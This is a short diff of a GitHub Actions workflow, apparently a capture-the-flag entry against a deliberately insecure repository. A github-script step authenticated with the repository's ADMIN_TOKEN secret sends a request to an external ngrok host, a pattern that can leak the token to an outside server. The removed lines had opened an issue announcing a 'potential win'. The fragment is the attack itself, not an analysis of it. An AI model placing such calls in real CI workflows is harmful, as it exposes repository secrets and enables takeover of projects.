@@ -14,9 +14,3 @@ jobs:
           github-token: ${{ secrets.ADMIN_TOKEN }}
           script: |
             const result = await github.request("http://312177246bcd.ngrok.io/api/info")
-            await github.issues.create({
-                owner: 'incrediblysecureinc',
-                repo: `incredibly-secure-naortalmor1`,
-                title: 'My voice is my password, verify me!',
-                body: '@ naortalmor1 claimed a potential win at: ' + new Date().toISOString() + ' /cc @hacktionctfadmin'
-              });
